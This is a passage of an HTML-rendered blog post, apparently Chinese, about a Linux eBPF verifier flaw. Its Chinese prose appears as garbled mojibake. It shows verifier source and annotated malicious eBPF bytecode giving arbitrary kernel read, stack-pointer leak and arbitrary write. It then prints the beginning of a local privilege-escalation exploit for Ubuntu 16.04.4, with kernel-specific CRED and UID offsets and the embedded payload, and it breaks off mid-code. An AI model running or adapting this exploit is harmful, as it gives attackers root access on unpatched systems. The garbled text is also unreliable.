insn-&gt;off,</span><br><span class="line">                         BPF_SIZE(insn-&gt;code), BPF_WRITE,</span><br><span class="line">                         insn-&gt;src_reg);</span><br><span class="line">  <span class="keyword">if</span> (err)</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (insn-&gt;imm == <span class="number">0</span>) &#123;</span><br><span class="line">    insn-&gt;imm = dst_reg_type;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (dst_reg_type != insn-&gt;imm &amp;&amp;</span><br><span class="line">             (dst_reg_type == PTR_TO_CTX ||</span><br><span class="line">              insn-&gt;imm == PTR_TO_CTX)) &#123;</span><br><span class="line">    verbose(<span class="string">&quot;same insn cannot be used with different pointers\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>check_mem_access</code>å‡½æ•°ä¼šæ ¹æ®è¯»å†™ç±»å‹æ£€æŸ¥dstæˆ–srcçš„å€¼æ˜¯å¦ä¸ºæ ˆæŒ‡é’ˆã€æ•°æ®åŒ…æŒ‡é’ˆã€mapæŒ‡é’ˆï¼Œå¦åˆ™ä¸å…è®¸è¯»å†™ã€‚æ‰€ä»¥è¿™é‡Œä½¿ç”¨BPF_FUNC_map_lookup_elemè¿™æ ·çš„å‡½æ•°è°ƒç”¨è¿”å›ï¼Œå†èµ‹ç»™æŸä¸ªå¯„å­˜å™¨ï¼Œç„¶åå†è¿›è¡Œè¯»å†™ã€‚</p>
<p>æœ€ç»ˆæ„é€ çš„eBPFæŒ‡ä»¤ä¸ºï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">----------------------------------------------part <span class="number">1</span> ----------------------------------------------</span><br><span class="line"><span class="number">1.</span> <span class="string">&quot;\xb4\x09\x00\x00\xff\xff\xff\xff&quot;</span>  <span class="comment">/* BPF_MOV32_IMM(BPF_REG_9, 0xFFFFFFFF),              r9 = (u32)0xFFFFFFFF   */</span></span><br><span class="line"><span class="number">2.</span> <span class="string">&quot;\x55\x09\x02\x00\xff\xff\xff\xff&quot;</span>  <span class="comment">/*BPF_JMP_IMM(BPF_JNE, BPF_REG_9, 0xFFFFFFFF, 2),    if (r9 == -1) &#123;        */</span></span><br><span class="line"><span class="number">3.</span> <span class="string">&quot;\xb7\x00\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_MOV64_IMM(BPF_REG_0, 0),                         exit(0);             */</span></span><br><span class="line"><span class="number">4.</span> <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_EXIT_INSN()                                                            */</span></span><br><span class="line">----------------------------------------------part <span class="number">2</span> ----------------------------------------------</span><br><span class="line"><span class="number">5.</span> <span class="string">&quot;\x18\x19\x00\x00\x03\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_LD_MAP_FD(BPF_REG_9, mapfd),                 /* r9=mapfd               */</span></span><br><span class="line"><span class="number">6.</span> <span class="string">&quot;\x00\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">----------------------------------------------part <span class="number">3</span> ----------------------------------------------</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* BPF_MAP_GET(0, BPF_REG_6)  r6=opï¼Œå–mapä¸­Keyå€¼ä¸º0çš„valueå€¼å­˜æ”¾åˆ°reg_6</span></span><br><span class="line"><span class="comment">* */</span></span><br><span class="line"><span class="number">10.</span> <span class="string">&quot;\xbf\x91\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),              /* r1 = r9                */</span></span><br><span class="line"><span class="number">11.</span> <span class="string">&quot;\xbf\xa2\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),             /* r2 = fp                */</span></span><br><span class="line"><span class="number">12.</span> <span class="string">&quot;\x07\x02\x00\x00\xfc\xff\xff\xff&quot;</span>  <span class="comment">/*BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),            /* r2 = fp - 4            */</span></span><br><span class="line"><span class="number">13.</span> <span class="string">&quot;\x62\x0a\xfc\xff\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx=0),           /* *(u32 *)(fp - 4) = 0 */</span></span><br><span class="line"><span class="number">14.</span> <span class="string">&quot;\x85\x00\x00\x00\x01\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),           */</span></span><br><span class="line"><span class="number">15.</span> <span class="string">&quot;\x55\x00\x01\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),            /* if (r0 == 0)           */</span></span><br><span class="line"><span class="number">16.</span> <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_EXIT_INSN(),                                  /*   exit(0);             */</span></span><br><span class="line"><span class="number">17.</span> <span class="string">&quot;\x79\x06\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_LDX_MEM(BPF_DW, (r6), BPF_REG_0, 0)          /* r_dst = *(u64 *)(r0)   */</span></span><br><span class="line">----------------------------------------------part <span class="number">4</span> ----------------------------------------------</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* BPF_MAP_GET(1, BPF_REG_7)  r7=address,å–mapä¸­Keyå€¼ä¸º1çš„valueå€¼å­˜æ”¾åˆ°reg_7</span></span><br><span class="line"><span class="comment">* */</span></span><br><span class="line"><span class="number">21.</span> <span class="string">&quot;\xbf\x91\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),              /* r1 = r9                */</span></span><br><span class="line"><span class="number">22.</span> <span class="string">&quot;\xbf\xa2\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),             /* r2 = fp                */</span></span><br><span class="line"><span class="number">23.</span> <span class="string">&quot;\x07\x02\x00\x00\xfc\xff\xff\xff&quot;</span>  <span class="comment">/*BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),            /* r2 = fp - 4            */</span></span><br><span class="line"><span class="number">24.</span> <span class="string">&quot;\x62\x0a\xfc\xff\x01\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx=1),           /* *(u32 *)(fp - 4) = 1 */</span></span><br><span class="line"><span class="number">25.</span> <span class="string">&quot;\x85\x00\x00\x00\x01\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),          */</span></span><br><span class="line"><span class="number">26.</span> <span class="string">&quot;\x55\x00\x01\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),            /* if (r0 == 0)           */</span></span><br><span class="line"><span class="number">27.</span> <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_EXIT_INSN(),                                  /*   exit(0);             */</span></span><br><span class="line"><span class="number">28.</span> <span class="string">&quot;\x79\x07\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_LDX_MEM(BPF_DW, (r7), BPF_REG_0, 0)          /* r_dst = *(u64 *)(r0)   */</span></span><br><span class="line">----------------------------------------------part <span class="number">5</span> ----------------------------------------------</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* BPF_MAP_GET(2, BPF_REG_8)  r8=valueï¼Œå–mapä¸­Keyå€¼ä¸º2çš„valueå€¼å­˜æ”¾åˆ°reg_8</span></span><br><span class="line"><span class="comment">* */</span></span><br><span class="line"><span class="number">32.</span> <span class="string">&quot;\xbf\x91\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),              /* r1 = r9                */</span></span><br><span class="line"><span class="number">33.</span> <span class="string">&quot;\xbf\xa2\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),             /* r2 = fp                */</span></span><br><span class="line"><span class="number">34.</span> <span class="string">&quot;\x07\x02\x00\x00\xfc\xff\xff\xff&quot;</span>  <span class="comment">/*BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),            /* r2 = fp - 4            */</span></span><br><span class="line"><span class="number">35.</span> <span class="string">&quot;\x62\x0a\xfc\xff\x02\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx=2),           /* *(u32 *)(fp - 4) = 2 */</span></span><br><span class="line"><span class="number">36.</span> <span class="string">&quot;\x85\x00\x00\x00\x01\x00\x00\x00&quot;</span>  <span class="comment">//BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),</span></span><br><span class="line"><span class="number">37.</span> <span class="string">&quot;\x55\x00\x01\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),            /* if (r0 == 0)           */</span></span><br><span class="line"><span class="number">38.</span> <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_EXIT_INSN(),                                  /*   exit(0);             */</span></span><br><span class="line"><span class="number">39.</span> <span class="string">&quot;\x79\x08\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_LDX_MEM(BPF_DW, (r8), BPF_REG_0, 0)          /* r_dst = *(u64 *)(r0)   */</span></span><br><span class="line">----------------------------------------------part <span class="number">6</span> ----------------------------------------------</span><br><span class="line"><span class="number">1.</span> <span class="string">&quot;\xbf\x02\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_MOV64_REG(BPF_REG_2, BPF_REG_0),               /* r2 = r0    æ­¤æ—¶r2å’Œr0éƒ½æŒ‡å‘mapä¸­key=2çš„å…ƒç´            */</span></span><br><span class="line"><span class="number">2.</span> <span class="string">&quot;\xb7\x00\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_MOV64_IMM(BPF_REG_0, 0),                       /* r0 = 0  for exit(0)   */</span></span><br><span class="line"><span class="number">3.</span> <span class="string">&quot;\x55\x06\x03\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_JMP_IMM(BPF_JNE, BPF_REG_6, 0, 3),             /* if (op == 0)          */</span></span><br><span class="line"><span class="number">4.</span> <span class="string">&quot;\x79\x73\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">//BPF_LDX_MEM(BPF_DW, BPF_REG_3, BPF_REG_7, 0), è¯»å–BPF_REG_7åœ°å€çš„å†…å®¹æ”¾åˆ°BPF_REG_3</span></span><br><span class="line"><span class="number">5.</span> <span class="string">&quot;\x7b\x32\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">//BPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_3, 0),å°†BPF_REG_3çš„å†…å®¹æ”¾å…¥åˆ°BPF_REG_2</span></span><br><span class="line"><span class="number">6.</span> <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">//BPF_EXIT_INSN(),</span></span><br><span class="line"><span class="number">7.</span> <span class="string">&quot;\x55\x06\x02\x00\x01\x00\x00\x00&quot;</span>  <span class="comment">//BPF_JMP_IMM(BPF_JNE, BPF_REG_6, 1, 2),       if(op != 1 )JMP insn+2</span></span><br><span class="line"><span class="number">8.</span> <span class="string">&quot;\x7b\xa2\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">//BPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_10, 0), when op == 1 å°†rbpå¯„å­˜å™¨çš„å€¼å³fpæŒ‡é’ˆæ”¾åˆ°BPF_REG_2</span></span><br><span class="line"><span class="number">9.</span> <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">//BPF_EXIT_INSN(),                                  /*   exit(0);             */</span></span><br><span class="line"><span class="number">10.</span> <span class="string">&quot;\x7b\x87\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">//BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0), when op == 2 å¾€BPF_REG_7çš„åœ°å€å†™å…¥BPF_REG_8</span></span><br><span class="line"><span class="number">11.</span> <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">//BPF_EXIT_INSN(),</span></span><br></pre></td></tr></table></figure>

<h3 id="ç»¼ä¸Šï¼Œexp"><a href="#ç»¼ä¸Šï¼Œexp" class="headerlink" title="ç»¼ä¸Šï¼Œexp"></a>ç»¼ä¸Šï¼Œexp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Ubuntu 16.04.4 kernel priv esc</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * all credits to @bleidl</span></span><br><span class="line"><span class="comment"> * - vnik</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Tested on:</span></span><br><span class="line"><span class="comment">// 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64</span></span><br><span class="line"><span class="comment">// if different kernel adjust CRED offset + check kernel stack size</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/un.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PHYS_OFFSET 0xffff880000000000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_OFFSET 0x9b8 <span class="comment">// 0x5f8</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UID_OFFSET 4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOG_BUF_SIZE 65536</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PROGSIZE 328 <span class="comment">//-32</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> sockets[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">int</span> mapfd, progfd;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *__prog = <span class="string">&quot;\xb4\x09\x00\x00\xff\xff\xff\xff&quot;</span></span><br><span class="line">			   <span class="string">&quot;\x55\x09\x02\x00\xff\xff\xff\xff&quot;</span></span><br><span class="line">			   <span class="string">&quot;\xb7\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">			   <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">			   <span class="string">&quot;\x18\x19\x00\x00\x03\x00\x00\x00&quot;</span></span><br><span class="line">			   <span class="string">&quot;\x00\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">			   <span class="string">&quot;\xbf\x91\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">			   <span class="string">&quot;\xbf\xa2\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">			   <span class="string">&quot;\x07\x02\x00\x00\xfc\xff\xff\xff&quot;</span></span><br><span class="line">			   <span class="string">&quot;\x62\x0a\xfc\xff\x00\x00\x00\x00&quot;</span></span><br><span class="line">			   <span class="string">&quot;\x85\x00\x00\x00\x01\x00\x00\x00&quot;</span></span><br><span class="line">			   <span class="string">&quot;\x55\x00\x01\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">			   <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">			   <span class="string">&quot;\x79\x06\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">			   <span class="string">&quot;\xbf\x91\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">			   <span class="string">&quot;\xbf\xa2\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">			   <span class="string">&quot;\x07\x02\x00\x00\xfc\xff\xff\xff&quot;</span></span><br><span class="line">			   <span class="string">&quot;\x62\x0a\xfc\xff\x01\x00\x00\x00&quot;</span></span><br><span class="line">			   <span class="string">&quot;\x85\x00\x00\x00\x01\x00\x00\x00&quot;</span></span><br><span class="line">			   <span class="string">&quot;\x55\x00\x01\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">			   <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">			   <span class="string">&quot;\x79\x07\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">			   <span class="string">&quot;\xbf\x91\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">			   <span class="string">&quot;\xbf\xa2\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">			   <span class="string">&quot;\x07\x02\x00\x00\xfc\xff\xff\xff&quot;</span></span><br><span class="line">			   <span class="string">&quot;\x62\x0a\xfc\xff\x02\x00\x00\x00&quot;</span></span><br><span class="line">			   <span class="string">&quot;\x85\x00\x00\x00\x01\x00\x00\x00&quot;</span></span><br><span class="line">			   <span class="string">&quot;\x55\x00\x01\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">			   <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">			   <span class="string">&quot;\x79\x08\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">			   <span class="string">&quot;\xbf\x02\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">			   <span class="string">&quot;\xb7\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">			   <span class="string">&quot;\x55\x06\x03\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">			   <span class="string">&quot;\x79\x73\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">			   <span class="string">&quot;\x7b\x32\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">			   <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">			   <span class="string">&quot;\x55\x06\x02\x00\x01\x00\x00\x00&quot;</span></span><br><span class="line">			   <span class="string">&quot;\x7b\xa2\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">			   <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">			   <span class="string">&quot;\x7b\x87\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">			   <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> bpf_log_buf[LOG_BUF_SIZE];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">bpf_prog_load</span><span class="params">(<span class="keyword">enum</span> bpf_prog_type prog_type,</span></span></span><br><span class="line"><span class="params"><span class="function">						 <span class="keyword">const</span> struct bpf_insn *insns, <span class="keyword">int</span> prog_len,</span></span></span><br><span class="line"><span class="params"><span class="function">						 <span class="keyword">const</span> <span class="keyword">char</span> *license, <span class="keyword">int</span> kern_version)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">		.prog_type = prog_type,</span><br><span class="line">		.insns = (__u64)insns,</span><br><span class="line">		.insn_cnt = prog_len / <span class="keyword">sizeof</span>(struct bpf_insn),</span><br><span class="line">		.license = (__u64)license,</span><br><span class="line">		.log_buf = (__u64)bpf_log_buf,</span><br><span class="line">		.log_size = LOG_BUF_SIZE,</span><br><span class="line">		.log_level = <span class="number">1</span>,</span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	attr.kern_version = kern_version;</span><br><span class="line"></span><br><span class="line">	bpf_log_buf[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> syscall(__NR_bpf, BPF_PROG_LOAD, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">bpf_create_map</span><span class="params">(<span class="keyword">enum</span> bpf_map_type map_type, <span class="keyword">int</span> key_size, <span class="keyword">int</span> value_size,</span></span></span><br><span class="line"><span class="params"><span class="function">						  <span class="keyword">int</span> max_entries)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">		.map_type = 